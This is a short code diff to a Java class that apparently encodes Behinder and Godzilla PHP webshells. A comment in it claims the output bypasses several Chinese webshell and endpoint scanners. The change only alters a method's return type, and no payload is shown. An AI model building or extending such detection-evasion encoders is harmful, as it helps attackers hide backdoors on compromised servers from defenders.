@@ -28,7 +28,7 @@ public class PhpEncodeDemo1 {
                 " * Bypass: 牧云、伏魔、安全狗、D盾、河马本地\n" +
                 " */";
     }
-    public String Run(){
+    public String[] Run(){
 
         if(!sourcecode.isEmpty()){
             try {
@@ -60,12 +60,12 @@ public class PhpEncodeDemo1 {
                 encode = encode.replace("$key$",this.key);
                 encode = encode.replace("$base64code$",s);
 
-                return this.encode;
+                return new String[]{this.encode,""};
             }catch (Exception e){
-                return "加密失败";
+                return new String[]{"加密失败",""};
             }
         }else {
-            return "请输入冰蝎、哥斯拉PHP源码";
+            return new String[]{"请输入冰蝎、哥斯拉php源码",""};
         }
 
     }
